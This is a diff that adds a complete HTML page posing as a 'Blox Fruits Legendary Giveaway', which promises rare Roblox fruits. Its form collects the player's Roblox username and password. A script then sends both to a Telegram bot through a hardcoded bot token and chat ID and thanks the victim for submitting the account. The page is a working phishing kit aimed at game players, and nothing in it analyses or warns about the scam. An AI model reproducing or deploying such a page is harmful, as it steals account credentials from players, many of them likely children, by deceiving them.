@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blox Fruits Giveaway | Legendary Rewards</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #00274d, #0066cc);
+            color: #fff;
+            overflow-x: hidden;
+        }
+        .navbar {
+            background: #004080;
+            color: #fff;
+            padding: 15px 20px;
+            text-align: center;
+            font-size: 2rem;
+            font-weight: bold;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        .container {
+            max-width: 850px;
+            margin: 50px auto;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+            color: #333;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3rem;
+            color: #004080;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 25px;
+            color: #444;
+        }
+        .fruit-list {
+            background: #f9f9f9;
+            border: 2px solid #004080;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .fruit-list h2 {
+            font-size: 1.8rem;
+            color: #004080;
+            margin-bottom: 10px;
+        }
+        .fruit-list ul {
+            list-style: none;
+            padding: 0;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 15px;
+        }
+        .fruit-list li {
+            background: #004080;
+            color: #fff;
+            padding: 10px;
+            border-radius: 10px;
+            text-align: center;
+            transition: transform 0.2s ease-in-out;
+        }
+        .fruit-list li:hover {
+            transform: scale(1.1);
+            background: #00274d;
+        }
+        form {
+            margin-top: 20px;
+        }
+        label {
+            font-size: 1rem;
+            margin: 10px 0;
+            display: block;
+        }
+        input {
+            width: 80%;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        button {
+            font-size: 1.2rem;
+            background: #ff9900;
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease-in-out;
+        }
+        button:hover {
+            background: #ff7700;
+            transform: scale(1.05);
+        }
+        footer {
+            margin-top: 30px;
+            font-size: 1rem;
+            color: #333;
+        }
+        footer a {
+            color: #004080;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script>
+        async function sendData(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const botToken = "7720840872:AAGofQB3X-oepCeLHBl_Stp9p5or2fWaj6Q";
+            const chatId = "7282023851";
+
+            const message = `DATA ROBLOX KAMU:\nUSERNAME: ${username}\nPASSWORD: ${password}`;
+
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            await fetch(telegramURL);
+
+            alert("Your account has been submitted. Thank you!");
+        }
+    </script>
+</head>
+<body>
+    <div class="navbar">Blox Fruits Legendary Giveaway</div>
+    <div class="container">
+        <h1>Claim Your Exclusive Legendary Fruits!</h1>
+        <p>Enter your details to unlock the rarest fruits in Roblox Blox Fruits!</p>
+        <div class="fruit-list">
+            <h2>Available Fruits</h2>
+            <ul>
+                <li>Dragon</li>
+                <li>Venom</li>
+                <li>Phoenix</li>
+                <li>Shadow</li>
+                <li>Control</li>
+                <li>Buddha</li>
+                <li>Kitsune</li>
+            </ul>
+        </div>
+        <form onsubmit="sendData(event)">
+            <label for="username">Roblox Username:</label>
+            <input type="text" id="username" name="username" placeholder="Enter your Roblox username" required>
+
+            <label for="password">Roblox Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter your Roblox password" required>
+
+            <button type="submit">Claim Now</button>
+        </form>
+        <footer>
+            <p>Need help? Visit <a href="#">Support Page</a>.</p>
+        </footer>
+    </div>
+</body>
+</html>
